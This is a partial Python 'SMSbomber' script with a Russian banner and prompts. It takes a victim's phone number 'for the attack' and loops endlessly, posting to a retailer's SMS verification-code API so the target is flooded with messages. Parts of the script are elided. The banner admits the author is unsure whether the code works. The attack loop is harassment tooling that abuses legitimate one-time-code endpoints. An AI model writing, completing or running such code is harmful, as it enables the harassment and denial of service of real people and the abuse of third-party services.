...
banner = """
									...
									░ ░  ░   ░   ▒    ░ ░      ░   ▒    ░    ░   ░   ▒  ░  ░  ░     ░  
										░          ░                 ░  ░ ░            ░        ░     ░ 
										      Я Не Хз Работает Или Нет (Писал Пьянный)
										╔════════════════════════════════════════════════════╗
										║ [N] Name: SMSbomber                                ║                              
										║ [S] Have Services: 50                              ║
										║ [C] Created by: @ImInfoFinder                      ║
										║ [V] Version: 1.0.0                                 ║
										╚════════════════════════════════════════════════════╝
"""
...
_phone = input('Введите Номер Для Аттаки(79xxxxxxxxx)-->> ')
...
while True:
	...
	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + Self.formatted_phone}) # type: ignore
